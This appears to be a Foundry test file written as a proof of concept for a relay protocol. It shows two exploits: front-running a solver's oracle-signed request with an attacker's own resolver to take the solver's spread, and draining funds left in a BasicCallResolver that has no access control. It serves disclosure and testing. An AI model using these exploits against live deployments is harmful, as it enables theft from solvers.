// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "relay/RelayHub.sol";
import "relay/RelayAllocator.sol";
import "relay/RelayExecutor.sol";
import "relay/Utils.sol";
import "relay/call-resolvers/ICallResolver.sol";
import "relay/call-resolvers/BasicCallResolver.sol";

/// @notice Minimal IPayloadBuilder for the PoC: returns a fixed non-empty payload.
contract MockPayloadBuilder is IPayloadBuilder {
  function buildPayload(
    string calldata,
    bytes calldata,
    BuildPayloadParams calldata
  ) external pure override returns (bytes memory payload) {
    return hex"1234";
  }

  function hashesToSign(
    string calldata,
    bytes calldata,
    bytes calldata
  ) external pure override returns (bytes32[] memory hashes) {
    hashes = new bytes32[](1);
    hashes[0] = keccak256("poc");
  }

  function curve() external pure override returns (string memory) {
    return "Ecdsa";
  }

  function family() external pure override returns (string memory) {
    return "ethereum-vm";
  }
}

/// @notice Solver-style resolver: holds an inventory of the output token and
/// swaps 1:1, returning exactly the signed minimum to the executor and keeping
/// the rest of the funded input as its spread.
contract SpreadResolver is ICallResolver {
  RelayHub public immutable hub;

  constructor(address _hub) {
    hub = RelayHub(_hub);
  }

  function execute(
    ExecuteAndWithdrawRequest calldata request,
    bool,
    bytes calldata
  ) external override {
    uint256 tokenOutId = Utils.generateTokenId(
      request.outChainId,
      request.outCurrency
    );
    // Return exactly the signed minimum; keep all funded input as spread.
    require(
      hub.transfer(msg.sender, tokenOutId, request.outAmountMinimum),
      "return failed"
    );
  }
}

/// @notice PoC: RelayExecutor does not commit to the call resolver in the
/// oracle-signed EIP-712 request, so any observer of a signed request can
/// front-run the solver's execution with their own resolver and take the
/// solver's entire spread. The user still receives the signed minimum, so
/// only the solver is harmed — but every BasicCallResolver-style execution
/// is exposed to this, and at scale it removes the solver's incentive to fill.
contract ExecutorFrontrunTest is Test {
  RelayHub internal hub;
  RelayAllocator internal allocator;
  RelayExecutor internal executor;
  MockPayloadBuilder internal builder;

  uint256 internal constant ORACLE_PK = 0xABCD;
  address internal oracle;

  address internal orderAddress = address(0x0BAD);
  address internal solver = address(0x5012);
  address internal attacker = address(0xA77A);

  string internal constant CHAIN = "ethereum";
  bytes internal constant IN_CURRENCY = hex"1111111111111111111111111111111111111111";
  bytes internal constant OUT_CURRENCY = hex"2222222222222222222222222222222222222222";
  bytes internal constant DEPOSITORY = hex"3333333333333333333333333333333333333333";

  uint256 internal tokenInId;
  uint256 internal tokenOutId;

  function setUp() public {
    oracle = vm.addr(ORACLE_PK);

    hub = new RelayHub(address(this));
    allocator = new RelayAllocator(
      address(this),
      address(hub),
      address(0x0AC1)
    );
    executor = new RelayExecutor(address(this), address(hub), address(allocator));
    builder = new MockPayloadBuilder();

    // Role wiring (as in production deployment).
    hub.grantRole(hub.OPERATOR_ROLE(), address(executor));
    hub.grantRole(hub.OPERATOR_ROLE(), address(allocator));
    hub.grantRole(hub.OPERATOR_ROLE(), address(this));
    executor.grantRole(executor.ORACLE_ROLE(), oracle);

    allocator.setPayloadBuilder(CHAIN, DEPOSITORY, address(builder));

    tokenInId = Utils.generateTokenId(CHAIN, IN_CURRENCY);
    tokenOutId = Utils.generateTokenId(CHAIN, OUT_CURRENCY);
  }

  function _signedRequest()
    internal
    view
    returns (ExecuteAndWithdrawRequest memory request, bytes memory sig)
  {
    Fee[] memory fees = new Fee[](0);
    request = ExecuteAndWithdrawRequest({
      inChainId: CHAIN,
      inCurrency: IN_CURRENCY,
      outChainId: CHAIN,
      outCurrency: OUT_CURRENCY,
      outAmountMinimum: 90 ether,
      depository: DEPOSITORY,
      orderAddress: orderAddress,
      receiver: hex"4444444444444444444444444444444444444444",
      data: "",
      fees: fees,
      nonce: bytes32(uint256(1)),
      deadline: block.timestamp + 1 hours
    });
    bytes32 digest = executor.hashExecuteAndWithdrawRequest(request);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(ORACLE_PK, digest);
    sig = abi.encodePacked(r, s, v);
  }

  function testFrontrunStealsSolverSpread() public {
    // Order funded with 100 input tokens.
    hub.mint(orderAddress, tokenInId, 100 ether);

    // Both the honest solver and the attacker hold output inventory.
    SpreadResolver solverResolver = new SpreadResolver(address(hub));
    SpreadResolver attackerResolver = new SpreadResolver(address(hub));
    hub.mint(address(solverResolver), tokenOutId, 90 ether);
    hub.mint(address(attackerResolver), tokenOutId, 90 ether);

    (ExecuteAndWithdrawRequest memory request, bytes memory sig) =
      _signedRequest();

    // ATTACKER front-runs the solver: same signed request, own resolver.
    vm.prank(attacker);
    bytes32 withdrawHash = executor.execute(
      request,
      address(attackerResolver),
      "",
      oracle,
      sig
    );
    assertTrue(withdrawHash != bytes32(0));

    // Attacker kept the full 100 input as spread (returned exactly the 90 minimum).
    assertEq(hub.balanceOf(address(attackerResolver), tokenInId), 100 ether);
    // The withdrawal burned exactly the 90 minimum from the spender alias.
    address spenderAlias = Utils.generateAddress(
      "relay",
      abi.encodePacked(address(executor))
    );
    assertEq(hub.balanceOf(spenderAlias, tokenOutId), 0);
    // The receiver's withdrawal was submitted to the allocator.
    assertEq(
      executor.orderAddressByWithdrawRequestHash(withdrawHash),
      orderAddress
    );

    // SOLVER's identical execution now reverts: the authorization is consumed.
    vm.prank(solver);
    vm.expectRevert(
      abi.encodeWithSelector(
        RelayExecutor.RequestAlreadyExecuted.selector,
        executor.hashExecuteAndWithdrawRequest(request)
      )
    );
    executor.execute(request, address(solverResolver), "", oracle, sig);

    // Solver earned nothing.
    assertEq(hub.balanceOf(address(solverResolver), tokenInId), 0);
  }

  function testBasicCallResolverRetainedFundsAreDrainable() public {
    // A solver retains profit (or forgets to sweep dust) in the shared
    // BasicCallResolver after an execution. Anyone can drain it: execute()
    // has no access control and sweeps the resolver's full balances.
    BasicCallResolver resolver = new BasicCallResolver(address(hub));
    hub.mint(address(resolver), tokenInId, 50 ether);

    BasicCallResolver.Call[] memory calls = new BasicCallResolver.Call[](0);
    BasicCallResolver.Sweep[] memory sweeps = new BasicCallResolver.Sweep[](1);
    sweeps[0] = BasicCallResolver.Sweep({
      recipient: attacker,
      tokenId: tokenInId
    });

    ExecuteAndWithdrawRequest memory empty;
    vm.prank(attacker);
    resolver.execute(
      empty,
      false,
      abi.encode(calls, sweeps)
    );

    assertEq(hub.balanceOf(attacker, tokenInId), 50 ether);
    assertEq(hub.balanceOf(address(resolver), tokenInId), 0);
  }
}
